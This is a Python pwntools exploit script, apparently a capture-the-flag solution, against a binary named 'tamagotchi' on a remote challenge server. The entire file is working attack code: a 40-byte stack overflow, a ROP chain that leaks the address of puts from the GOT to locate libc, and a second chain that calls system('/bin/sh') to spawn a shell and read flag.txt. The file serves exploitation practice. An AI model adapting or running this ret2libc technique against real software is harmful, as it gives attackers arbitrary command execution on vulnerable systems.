from pwn import *

# Setup script
offset = 40 # This is the found offset to pollute rip
elf = ELF("./tamagotchi", checksec=False)
context.binary = elf
context.log_level = 'warn'

if args.REMOTE:
    host = args.HOST or "motherload.td.org.uit.no"
    port = int(args.PORT or 8009)
    p = remote(host, port)
    libc = "./libc6_2.31-0ubuntu9.9_amd64.so"
    print("Using remote")
else:
    p = elf.process()
    libc = "./libc6-amd64_2.11.1-0ubuntu7.12_i386.so"
    print("Using local")

# Load correct libc
libc = ELF(libc, checksec=False)

# Prepare to send payload
p.recvuntil(b">>")
p.sendline(b"2")
p.recvuntil(b">>")

# Get the libc puts offset
rop = ROP(elf)
rop.call("puts", [elf.got['puts']]) # Get the "Global Offset Table" 
rop.call(elf.symbols["feed"]) # Set it up for a new payload

# Generate payload
payload  = b"A"*offset # Offset
payload += rop.chain()

# Execute 
p.sendline(payload)

# Find offset
p.recvuntil(b"\n\n")
libc_puts_offset  = u64(p.recvuntil(b"\n").rstrip().ljust(8,b"\x00"))
print(f"puts found at {hex(libc_puts_offset)}")
libc.address = libc_puts_offset - libc.symbols["puts"]
test = p.recvuntil(b">> ")

# Prepare the attack
rop = ROP(libc)
rop.call("system", [next(libc.search(b"/bin/sh"))])

# Generate payload
payload  = b"B"*offset # Offset
payload += p64(0x000000000040101a) # Ret
payload += rop.chain()

# Execute 
p.sendline(payload)

# Go interactive
p.recvuntil(b"\n\n")
p.sendline(b"cat flag.txt")
print(p.recvuntil(b"\n").decode())
p.interactive()
